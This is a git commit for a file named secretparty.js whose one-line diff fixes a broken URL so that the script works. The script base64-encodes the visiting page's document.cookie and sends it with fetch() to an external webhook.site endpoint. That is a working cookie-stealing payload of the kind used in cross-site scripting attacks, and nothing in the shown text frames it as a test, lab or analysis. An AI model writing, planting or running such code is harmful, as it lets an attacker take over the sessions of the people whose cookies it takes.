00bbbc8c26e86a0d6abcb9f1fc1a94b788152fbf
digmore <digmore@users.noreply.github.com>
2025-08-10 18:13:37 +1200

    Update secretparty.js

--- secretparty.js
+++ secretparty.js
@@ -1,1 +1,1 @@
-fetch('https://https://webhook.site/a6a7ef21-500f-4328-a6d9-c3566c6a73db?data='+btoa(document.cookie))
+fetch('https://webhook.site/a6a7ef21-500f-4328-a6d9-c3566c6a73db?data='+btoa(document.cookie))
